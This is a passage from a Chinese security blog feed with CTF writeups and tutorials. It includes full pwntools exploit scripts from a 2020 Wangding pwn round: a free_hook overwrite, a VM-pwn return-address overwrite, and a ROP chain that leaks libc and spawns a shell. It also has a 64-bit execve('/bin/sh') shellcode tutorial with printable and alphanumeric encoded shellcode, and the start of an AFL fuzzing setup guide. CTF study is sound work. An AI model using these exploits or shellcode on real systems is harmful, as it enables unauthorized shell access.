class="string">'\x58'</span></span><br><span class="line">	<span class="keyword">elif</span> i == <span class="number">137</span>:</span><br><span class="line">		b += <span class="string">'\x5a'</span></span><br><span class="line">	<span class="keyword">elif</span> i == <span class="number">154</span>:</span><br><span class="line">		b += <span class="string">'\x6c'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		b += pay2[i]</span><br><span class="line">p.sendline(b)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>strlen的00截断问题，构造下可见字符开头再加上00的指令就行了(这里用了push 0)，另外这道题无法直接getshell，所以找了个直接读flag的：<br><img src="./img/1575164292115.png" alt="1575164292115"></p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>简单的计算题，直接提取后eval计算就行了</p>
<p><img src="./img/1575162995333.png" alt="1575162995333"></p>
<h2 id="fun"><a href="#fun" class="headerlink" title="fun"></a>fun</h2><p>猜拳游戏。。。之前字节跳动的比赛也有，。。直接上writeup</p>
<p><img src="./img/1575163042586.png" alt="1575163042586"></p>
<h2 id="听说你想要平均值"><a href="#听说你想要平均值" class="headerlink" title="听说你想要平均值"></a>听说你想要平均值</h2><p>这道题首先就是从png文件中提取出一个无加密的压缩包，CRC和flag.zip一样，直接明文攻击（参考<a href="https://www.cnblogs.com/leixiao-/p/9824557.html）" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/9824557.html）</a></p>
<p>然后后面解压的除了出来第一个是<img src="./img/1575163177753.png" alt="1575163177753"></p>
<p>中13600的一半6800的base64编码，再继续解压出来的密码就是here.txt里的数字进行base64编码了，上脚本√</p>
<p><img src="./img/1575163352856.png" alt="1575163352856"></p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>讲实话，这道题有点难，刚开始还被拐歪了。。。真正的密文应该是这里</p>
<p><img src="./img/1575163934277.png" alt="1575163934277"></p>
<p>然后再进行逆运算就好了</p>
<p><img src="./img/1575163944282.png" alt="1575163944282"></p>
<h2 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h2><p>先放到<a href="http://tool.lu/pyc/反编译，得到密文，以及加密方法，直接逆推就行了：" target="_blank" rel="noopener">http://tool.lu/pyc/反编译，得到密文，以及加密方法，直接逆推就行了：</a></p>
<p><img src="./img/1575163633664.png" alt="1575163633664"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>首先用脚本过前面的md5，然后再用login得到前面，计算出x，然后再签admin即可（ps：另外几个函数照抄就行）：</p>
<p><img src="./img/1575163734176.png" alt="1575163734176"></p>
]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>2020网鼎青龙组pwn-wp</title>
    <url>/2020/05/19/wp/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84/2020%E7%BD%91%E9%BC%8E%E9%9D%92%E9%BE%99%E7%BB%84pwn-wp/</url>
    <content><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>一个语义分析的程序，好像是c4编译器（不清楚不了解，毕竟没有上过半节计算机的课），栈、text、symbol都存放在malloc出来的几块大内存上，可以定义全局变量和局部变量，局部变量存在栈上。通过局部变量leak出栈地址，再接着leak libc基地址，最后修改free_hook为onegadget一把梭。在（PS：这里已经有libc地址并且能任意写了，所以还有一大堆的利用方式，都可以用）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">p &#x3D; remote(&quot;182.92.73.10&quot;,24573)</span><br><span class="line">#gdb.attach(p,&#39;b free&#39;)</span><br><span class="line">p.sendline(&#39;&#39;&#39;</span><br><span class="line">libc;</span><br><span class="line">*ptr;</span><br><span class="line">*stack;</span><br><span class="line">chunk;</span><br><span class="line">main()&#123;</span><br><span class="line">	void *add;</span><br><span class="line">	add &#x3D; &amp;add;</span><br><span class="line">	stack &#x3D; add + 0x18;</span><br><span class="line">	stack &#x3D; *stack;</span><br><span class="line">	stack &#x3D; stack -29;</span><br><span class="line">	libc &#x3D; *stack -0x20830;</span><br><span class="line">	ptr &#x3D; libc+0x3c67a8;</span><br><span class="line">	*ptr &#x3D; libc+0x4526a;</span><br><span class="line">	free(chunk);</span><br><span class="line">&#125;</span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="boom2"><a href="#boom2" class="headerlink" title="boom2"></a>boom2</h2><p>vmpwn题，实现了几个汇编指令，不过一大堆没用的。思路：首先获得指向libc_start_main+240的指针，并且push进栈以保存，然后通过add等指令计算出onegadget地址，再通过前面保存的指针覆写返回地址，最后getshell。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">'182.92.73.10'</span>, <span class="number">36642</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_base</span><span class="params">(i)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	payload += p64(<span class="number">0</span>) + p64(i)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	payload += p64(<span class="number">13</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	payload += p64(<span class="number">26</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">imm</span><span class="params">(n)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">		n += <span class="number">1</span> &lt;&lt; <span class="number">64</span></span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	payload += p64(<span class="number">1</span>) + p64(n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	payload += p64(<span class="number">9</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wm</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	payload += p64(<span class="number">11</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> payload</span><br><span class="line">	payload += p64(<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取宿主机的栈地址</span></span><br><span class="line">stack_base((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">4</span>)</span><br><span class="line">rm()</span><br><span class="line">push()</span><br><span class="line">imm(<span class="number">0xe8</span>)</span><br><span class="line">sub()	<span class="comment">#reg = main_stack = stack_point - 0xe8</span></span><br><span class="line">push()</span><br><span class="line"><span class="comment">#获取宿主机的libc_start_main+240地址</span></span><br><span class="line"></span><br><span class="line">rm() <span class="comment">#reg = *main_stack = libc_start_main+0x240</span></span><br><span class="line">push()</span><br><span class="line"><span class="comment">#计算偏移</span></span><br><span class="line">imm(<span class="number">0xD0917</span>) <span class="comment">#reg = offset</span></span><br><span class="line">add() <span class="comment">#add reg,stack</span></span><br><span class="line"><span class="comment">#替换libc_start_main+240也就是返回地址为onegadget</span></span><br><span class="line">wm()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"Input your code&gt;"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="faster0"><a href="#faster0" class="headerlink" title="faster0"></a>faster0</h2><p>这道题比赛的时候没有做出来。。。那个path太恶心了。然后找了pizza大佬要了脚本来看看，发现用了Capstone（嗯，不会用，所以也顺便去学了下）。大概思路就是：先获取函数地址与对应函数索引的值（比如func000就是{0:0x4008A4}）形成map；然后通过Capstone获取其中的一个跳转的table，对其中的数值解析获取到跳转函数地址（call func001这些指令）；然后再利用call指令中的相对偏移加上call下一指令的地址获取到跳转到目标函数的地址形成路线图；再通过路线图与前面形成的map就可以得出path。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line"></span><br><span class="line">fnlist = [] <span class="comment"># idx =&gt; addr</span></span><br><span class="line">fndict = &#123;&#125; <span class="comment"># addr =&gt; idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):	<span class="comment">#获取函数地址</span></span><br><span class="line">    fn = elf.sym[<span class="string">'func&#123;:0&gt;3d&#125;'</span>.format(i)]</span><br><span class="line">    fnlist.append(fn)</span><br><span class="line">    fndict[fn] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis</span><span class="params">(addr)</span>:</span><span class="comment">#获取第一条指令</span></span><br><span class="line">    buf = elf.read(addr, <span class="number">16</span>)</span><br><span class="line">    insn = next(cs.disasm(buf, addr))</span><br><span class="line">    <span class="keyword">return</span> insn</span><br><span class="line"></span><br><span class="line">fnmap = []</span><br><span class="line">fbase = <span class="number">0x4008A4</span></span><br><span class="line"><span class="keyword">for</span> idx, addr <span class="keyword">in</span> enumerate(fnlist[:<span class="number">1</span>]):</span><br><span class="line">    buf = elf.read(addr, <span class="number">256</span>)</span><br><span class="line">    pt1 = <span class="string">'89 C0 48 8D 14 85 00 00 00 00'</span>.replace(<span class="string">' '</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    p1 = buf.find(pt1) + len(pt1)	<span class="comment">#p1为lea     rax, off_406034在函数中的偏移</span></span><br><span class="line"></span><br><span class="line">    i0 = dis(p1 + addr)</span><br><span class="line">    disp = i0.operands[<span class="number">1</span>].mem.disp</span><br><span class="line">    tbl = disp + p1 + addr + i0.size<span class="comment">#table地址</span></span><br><span class="line">    rels = [u32(elf.read(tbl + i * <span class="number">4</span>, <span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]<span class="comment">#读取table并储存</span></span><br><span class="line">    dests = []</span><br><span class="line">    <span class="keyword">for</span> rel <span class="keyword">in</span> rels:</span><br><span class="line">        tmp = (tbl + rel) &amp; <span class="number">0xffffffff</span>	<span class="comment">#获得对应jmp到的地址</span></span><br><span class="line">        i1 = dis(tmp + <span class="number">5</span>)</span><br><span class="line">        call = i1.operands[<span class="number">0</span>].imm<span class="comment">#获取call目标函数的地址</span></span><br><span class="line">        didx = fndict[call]<span class="comment">#获取函数地址对应的函数idx</span></span><br><span class="line">        dests.append(didx)<span class="comment">#构造出全部路线</span></span><br><span class="line">    fnmap.append(dests[:])<span class="comment">#构造总的路线图</span></span><br><span class="line"></span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">while</span> cur != <span class="number">100</span>:</span><br><span class="line">    t = fnmap[cur]</span><br><span class="line">    path.append(t.index(cur + <span class="number">1</span>))<span class="comment">#开始寻路</span></span><br><span class="line">    cur += <span class="number">1</span></span><br><span class="line">path = <span class="string">''</span>.join(map(str, path))<span class="comment">#将列表转为字符串</span></span><br><span class="line">info(<span class="string">'path: &#123;&#125;'</span>.format(path))</span><br></pre></td></tr></table></figure>

<p>然后接下来就是一个简单的栈溢出，没啥好讲的，直接上完整的exp吧：</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>首先是前面过pow的加上获得elf的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">token = ****</span><br><span class="line">p = remote(<span class="string">"39.96.72.181"</span>,<span class="string">"42732"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"x[:20] = "</span>)</span><br><span class="line">dest = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> product(printable, repeat=<span class="number">4</span>):</span><br><span class="line">	s = <span class="string">''</span>.join(i)</span><br><span class="line">	x = hashlib.sha256(s).hexdigest()</span><br><span class="line">	x2 = x[:<span class="number">20</span>]</span><br><span class="line">	<span class="keyword">if</span> dest == x2:</span><br><span class="line">		print(<span class="string">'string : '</span> + s)</span><br><span class="line">		p.sendline(s)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input your token:"</span>)</span><br><span class="line">p.sendline(token)</span><br><span class="line">p.recvuntil(<span class="string">"Creating pwn file, please wait ...\n"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">s = p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = base64.b64decode(s)</span><br><span class="line">f = open(<span class="string">"pwn"</span>,<span class="string">'wb+'</span>)</span><br><span class="line">f.write(a)</span><br><span class="line">f.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>然后是elf的一个getshell：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">"pwn"</span>).libc</span><br><span class="line"></span><br><span class="line">fnlist = [] <span class="comment"># idx =&gt; addr</span></span><br><span class="line">fndict = &#123;&#125; <span class="comment"># addr =&gt; idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">101</span>):	<span class="comment">#获取函数地址</span></span><br><span class="line">    fn = elf.sym[<span class="string">'func&#123;:0&gt;3d&#125;'</span>.format(i)]</span><br><span class="line">    fnlist.append(fn)</span><br><span class="line">    fndict[fn] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dis</span><span class="params">(addr)</span>:</span><span class="comment">#获取第一条指令</span></span><br><span class="line">    buf = elf.read(addr, <span class="number">16</span>)</span><br><span class="line">    insn = next(cs.disasm(buf, addr))</span><br><span class="line">    <span class="keyword">return</span> insn</span><br><span class="line"></span><br><span class="line">fnmap = []</span><br><span class="line">fbase = <span class="number">0x4008A4</span></span><br><span class="line"><span class="keyword">for</span> idx, addr <span class="keyword">in</span> enumerate(fnlist[:<span class="number">100</span>]):</span><br><span class="line">    buf = elf.read(addr, <span class="number">256</span>)</span><br><span class="line">    pt1 = <span class="string">'89 C0 48 8D 14 85 00 00 00 00'</span>.replace(<span class="string">' '</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    p1 = buf.find(pt1) + len(pt1)	<span class="comment">#p1为lea     rax, off_406034在函数中的偏移</span></span><br><span class="line"></span><br><span class="line">    i0 = dis(p1 + addr)</span><br><span class="line">    disp = i0.operands[<span class="number">1</span>].mem.disp</span><br><span class="line">    tbl = disp + p1 + addr + i0.size<span class="comment">#table地址</span></span><br><span class="line">    rels = [u32(elf.read(tbl + i * <span class="number">4</span>, <span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)]<span class="comment">#读取table并储存</span></span><br><span class="line">    dests = []</span><br><span class="line">    <span class="keyword">for</span> rel <span class="keyword">in</span> rels:</span><br><span class="line">        tmp = (tbl + rel) &amp; <span class="number">0xffffffff</span>	<span class="comment">#获得对应jmp到的地址</span></span><br><span class="line">        i1 = dis(tmp + <span class="number">5</span>)</span><br><span class="line">        call = i1.operands[<span class="number">0</span>].imm<span class="comment">#获取call目标函数的地址</span></span><br><span class="line">        didx = fndict[call]<span class="comment">#获取函数地址对应的函数idx</span></span><br><span class="line">        dests.append(didx)<span class="comment">#构造出全部路线</span></span><br><span class="line">    fnmap.append(dests[:])<span class="comment">#构造总的路线图</span></span><br><span class="line"></span><br><span class="line">cur = <span class="number">0</span></span><br><span class="line">path = []</span><br><span class="line"><span class="keyword">while</span> cur != <span class="number">100</span>:</span><br><span class="line">    t = fnmap[cur]</span><br><span class="line">    path.append(t.index(cur + <span class="number">1</span>))<span class="comment">#开始寻路</span></span><br><span class="line">    cur += <span class="number">1</span></span><br><span class="line">path = <span class="string">''</span>.join(map(str, path))<span class="comment">#将列表转为字符串</span></span><br><span class="line">info(<span class="string">'path: &#123;&#125;'</span>.format(path))</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="comment">#p = remote(IP, PORT)</span></span><br><span class="line">p.sendline(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_ptr = <span class="number">0x400640</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000406013</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000406011</span></span><br><span class="line">write_got = <span class="number">0x609018</span></span><br><span class="line">bss = <span class="number">0x609500</span></span><br><span class="line">read_ptr = <span class="number">0x400680</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0xd0</span></span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(write_got)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_ptr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_ptr)</span><br><span class="line">payload += p64(<span class="number">0x405f4a</span>)</span><br><span class="line">payload += p64(<span class="number">0x405F30</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"WOW,U R GREAT !\n"</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.sym[<span class="string">'write'</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(p64(<span class="number">0</span>)+p64(pop_rdi)+p64(libc.search(<span class="string">"/bin/sh"</span>).next())+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WP</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>64位shellcode编写</title>
    <url>/2020/05/09/%E6%96%87%E7%AB%A0/shellcode/64%E4%BD%8Dshellcode%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>目前网上主要是各种32位的shellcode编写教程，64位的比较少，这篇文章主要讲解一下64位shellcode的编写以及介绍几种比较常见的白名单绕过方法</p>
<h3 id="64位shellcode编写"><a href="#64位shellcode编写" class="headerlink" title="64位shellcode编写"></a>64位shellcode编写</h3><h4 id="直接pwntools生成默认shellcode"><a href="#直接pwntools生成默认shellcode" class="headerlink" title="直接pwntools生成默认shellcode"></a>直接pwntools生成默认shellcode</h4><p>这一种方法是最简单的，通过下面的代码即可生成一段64位shellcode代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<p>但这段代码有一个缺点，就是生成的shellcode比较长，在某些空间比较小的情况不能很好的使用，接下来我们就一步一步的学习手动编写shellcode吧。</p>
<h4 id="手动编写shellcode"><a href="#手动编写shellcode" class="headerlink" title="手动编写shellcode"></a>手动编写shellcode</h4><p>在手动编写shellcode之前，我们首先要知道shellcode这一段代码调动shell的原理。</p>
<p>linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch/x86/entry/syscall_64.tbl获得对应的系统调用号。比如，execve对应的的系统调用号为59。</p>
<p>接着，即是通过rdi和rsi两个寄存器传入参数。其中，rdi是指向运行程序的路径的指针，rsi为一个指向0的指针，rdx为0。</p>
<p>总结下，我们应该完成如下操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rax &#x3D; 59</span><br><span class="line">rdi &#x3D; [&#39;&#x2F;bin&#x2F;sh&#39;]</span><br><span class="line">rsi &#x3D; [0]</span><br><span class="line">rdx &#x3D; 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>所以就可以编写我们就可以开始正式编写了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rax,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>(这里因为64位数据不能直接push，所以用了rax寄存器来传递)</p>
<p>编写完后，我们可以用pwntools模块来快速编译使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure>

<p>这样生成的shellcode就只有30字节，一般这种大小就足够了。</p>
<h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><h4 id="可打印ascii"><a href="#可打印ascii" class="headerlink" title="可打印ascii"></a>可打印ascii</h4><p>这一种的限制一般是要求shellcode为可打印字符，包括字母、数字、符号。</p>
<p>针对这一种白名单，已经有了一个不错的工具：<a href="https://github.com/rcx/shellcode_encoder" target="_blank" rel="noopener">shellcode_encoder</a></p>
<p>使用这一工具首先需要安装z3-solver：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install z3-solver</span><br></pre></td></tr></table></figure>

<p>开始生成可打印shellcode前，我们需要先将原来的shellcode输出到一个文件中，这里我们用python来执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">f = open(<span class="string">'shellcode'</span>,<span class="string">'wb+'</span>)</span><br><span class="line">f.write(shellcode)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>然后，将生成的shellcode文件放到shellcode_encoder目录下，运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python main.py shellcode rax+29</span><br></pre></td></tr></table></figure>

<p>其中，shellcode是我们生成的shellcode文件，然后因为漏洞程序是通过call rax调用shellcode的，以及shellcode_encoder生成shellcode时的偏移位置，所以这里用了rax+29。</p>
<p>然后就会自动生成可打印的shellcode了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Original length: 30</span><br><span class="line">Encoded length:  476</span><br><span class="line">Preamble length: 29</span><br><span class="line">Total length:    505</span><br><span class="line"></span><br><span class="line">PPTAYAXVI31VXXXf-C_f-@hf-&#96;8PZTAYAXVI31VXPP[_Hc4:14:SX- (mz-i Wx5?&lt;??P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-IL+N-@x6x5?41&#125;P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-Txl(-H0| 5V__&gt;P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-Gz#&#39;-~  @5?_?_P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-e3&#39;R-T)@~5O ^?P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-&amp;Pu8-( @@57O?oP^14:WX-|w_?-@U@C-@3&#96;&#125;P_SX-:AXH-#?Hx5;~_?P_Hc4:14:SX- $80- ,  5?M7?P^14:WX-|w_?-@U@C-@3&#96;&#125;P_SX-@dG1- dyo5&lt;6?_P^SX-zphB-&#96;&#96;(~5&gt;&#x2F;o?P_AAAAo&#123;5mTM&#x3D;K8_?* *v k1jXk_DC(%r:ou&#125;&#125;n;oopM]alYoM0&quot;+&#x2F;O%Y2P9@&quot;USR2|O?+</span><br></pre></td></tr></table></figure>

<p>可以看到shellcode的总长是505，这样的长度对于某些特定的题目来说是不行的，所以下面介绍另一种shellcode。</p>
<h4 id="纯数字字母shellcode"><a href="#纯数字字母shellcode" class="headerlink" title="纯数字字母shellcode"></a>纯数字字母shellcode</h4><p>文章：<a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener">https://hama.hatenadiary.jp/entry/2017/04/04/190129</a></p>
<p>这里就不具体分析了，直接给出最终的shellcode，感兴趣的可以自行阅读学习</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>AFL-fuzz初体验</title>
    <url>/2020/05/09/%E6%96%87%E7%AB%A0/fuzzing/AFL-fuzz%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>安装环境：（有点大，可以先换下源）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install clang-6.0 build-essential llvm-6.0-dev gnuplot-nox</span><br></pre></td></tr></table></figure>

<p>修改配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo update-alternatives --install /usr/bin/clang clang `<span class="built_in">which</span> clang-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/clang++ clang++ `<span class="built_in">which</span> clang++-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/llvm-config llvm-config `<span class="built_in">which</span> llvm-config-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/llvm-symbolizer llvm-symbolizer `<span class="built_in">which</span> llvm-symbolizer-6.0` 1</span><br></pre></td></tr></table></figure>

<p>安装afl-fuzz</p>
